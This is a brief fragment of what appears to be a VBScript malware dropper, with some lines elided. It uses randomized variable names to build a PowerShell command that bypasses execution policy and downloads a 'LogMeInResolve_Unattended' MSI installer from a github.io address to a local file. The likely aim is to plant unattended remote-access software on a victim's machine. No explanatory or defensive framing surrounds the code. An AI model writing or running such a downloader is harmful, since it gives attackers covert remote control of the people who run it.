...
' URL: https://linedonginf12.github.io/za/LogMeInResolve_Unattended%20(8).msi
Option Explicit
...
FWCsT = "powershell -NoProfile -ExecutionPolicy Bypass -Command " & Chr(34) & "(New-Object Net.WebClient).DownloadFile(" & Chr(39) & "https://linedonginf12.github.io/za/LogMeInResolve_Unattended%20(8).msi" & Chr(39) & "," & Chr(39) & TjtzMjHd & Chr(39) & ")" & Chr(34)
